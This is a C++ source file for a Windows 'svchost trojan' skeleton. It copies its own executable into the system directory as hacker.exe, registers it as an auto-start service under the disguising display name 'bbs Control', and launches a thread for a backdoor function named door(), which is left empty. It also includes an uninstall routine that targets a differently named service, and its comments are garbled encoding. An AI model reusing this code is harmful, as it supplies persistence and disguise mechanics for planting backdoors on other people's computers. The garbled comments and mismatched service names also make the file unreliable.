#ifndef SVCHOST_TROJAN_CPP
#define SVCHOST_TROJAN_CPP

//#define SVCHOST_TROJAN_TEST

#include <stdio.h>
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

void WINAPI serviceMain(DWORD, LPTSTR*);
void WINAPI serviceCtrlHandler(DWORD opCode);
bool installCmdService();
void delServices();
void door();
SERVICE_STATUS m_serviceStatus;
SERVICE_STATUS_HANDLE m_serviceStatusHandle;
bool bRunning = true;
HANDLE hThread;
DWORD dwThreadId;

#ifdef SVCHOST_TROJAN_TEST
int main(int argc,char * argv[])
{
	SERVICE_TABLE_ENTRY dispatchTable[] = 
	{
		{ TEXT("system"), serviceMain },
		{ NULL, NULL }
	};
	if (argc == 2)
	{
		if (!stricmp(argv[1], "-i"))
		{
			installCmdService();
		}
		else if (!stricmp(argv[1], "-r"))
		{
			delServices();
		}
		return 0;
	}

	StartServiceCtrlDispatcher(dispatchTable);//����ڵ�ĵ�ַ����
	return 0;

	return 0;
}
#endif

// ľ�����������
void door()
{
	
}

// ����������
void WINAPI serviceMain(DWORD dwArgc, LPTSTR* lpArgv)
{
	// ��ʼ���������ڿ�ʼ
	m_serviceStatus.dwServiceType = SERVICE_WIN32;
	m_serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	// ������Խ��ܵ���������ֻ����ֹͣ�����������ͣ�ָ�����
	m_serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	m_serviceStatus.dwWin32ExitCode = 0;
	m_serviceStatus.dwServiceSpecificExitCode = 0;
	m_serviceStatus.dwCheckPoint = 0;
	m_serviceStatus.dwWaitHint = 0;
	
	m_serviceStatusHandle = RegisterServiceCtrlHandler(TEXT("system"), serviceCtrlHandler);
	// serviceCtrlHandler ������Ƴ��򣬿�ʼ����ͣ���ָ���ֹͣ����ȿ��Ʋ���
	if (m_serviceStatusHandle == (SERVICE_STATUS_HANDLE)0)
		return;
	//���÷���״̬
	m_serviceStatus.dwCurrentState = SERVICE_RUNNING;
	m_serviceStatus.dwCheckPoint = 0;
	m_serviceStatus.dwWaitHint = 0;
	// �������SetServiceStatus() ����Ӧ������Ƴ����ÿ������֪ͨ��ServiceStatus�ṹ����7����Ա����ӳ���������״̬����
	// ������Щ��Ա����������ṹ�����ݵ�SetServiceStatus֮ǰ��ȷ����
	SetServiceStatus(m_serviceStatusHandle, &m_serviceStatus);
	bRunning = true;
	// �����߳����������ų��� door()
	if (!(hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)door, (LPVOID)0, 0, &dwThreadId)))
		return;
}

// ������ƺ���
void WINAPI serviceCtrlHandler(DWORD opCode)
{
	switch (opCode)
	{
	case SERVICE_CONTROL_PAUSE: //��ֹ
		m_serviceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE: //����
		m_serviceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_STOP: //��ͣ
		m_serviceStatus.dwWin32ExitCode = 0;
		m_serviceStatus.dwCurrentState = SERVICE_STOPPED;
		m_serviceStatus.dwCheckPoint = 0;
		m_serviceStatus.dwWaitHint = 0;

		SetServiceStatus(m_serviceStatusHandle, &m_serviceStatus);
		bRunning = false;
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
}

// ��װ������
bool installCmdService()
{
	TCHAR strDir[1024];
	SC_HANDLE schSCManager, schService;
	GetCurrentDirectory(1024, strDir);
	GetModuleFileName(NULL, strDir, sizeof(strDir));
	TCHAR chSysPath[1024];
	GetSystemDirectory(chSysPath, sizeof(chSysPath));
	strcat(chSysPath, TEXT("\\hacker.exe"));
	// �ѷ�������Ƶ�ϵͳ��Ŀ¼����������
	if (CopyFile(strDir, chSysPath, FALSE))
		printf("Copy file OK\n");
	strcpy(strDir, chSysPath);
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL)
	{
		printf("open scmanager failed,maybe you do not have the privilage to do this\n");
		return false;
	}
	LPCTSTR lpszBinaryPathName = strDir;
	// �ѷ�����Ϣ��ӵ�SCM�����ݿ⣬������Ϊhacker����ʾ�ķ�����Ϊ bbs Control
	schService = CreateService(schSCManager,
		TEXT("hacker"),
		TEXT("bbs Control"),
		SERVICE_ALL_ACCESS,					// ���з���Ȩ��
		SERVICE_WIN32_OWN_PROCESS,			// ��������
		SERVICE_AUTO_START,					// ��������
		SERVICE_ERROR_NORMAL,				// ���Դ�����
		lpszBinaryPathName,					// ����·��
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);
	if (schService)
		printf("Install service success!\n");
	else
		return false;
	CloseServiceHandle(schService);
	return true;
}

// ɾ��������
void delServices()
{
	TCHAR name[100];
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;
	strcpy(name, TEXT("system"));
	if ((scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL)
	{
		printf("OpenSCManager Error!\n");
	}
	service = OpenService(scm, name, SERVICE_ALL_ACCESS | DELETE);
	if (!service)
	{
		printf("OpenService error!\n");
		return;
	}
	bool isSucess = QueryServiceStatus(service, &status);
	if (!isSucess)
	{
		printf("QueryServiceStatus error!\n");
		return;
	}

	if (status.dwCurrentState != SERVICE_STOPPED)
	{
		isSucess = ControlService(service, SERVICE_CONTROL_STOP, &status);
		if (!isSucess)
			printf("Stop service error!\n");
		Sleep(500);
	}
	isSucess = DeleteService(service);
	if (!isSucess)
		printf("Delete service fail!\n");
	else
		printf("Delete service success!\n");
	CloseServiceHandle(service);
	CloseServiceHandle(scm);
}
#endif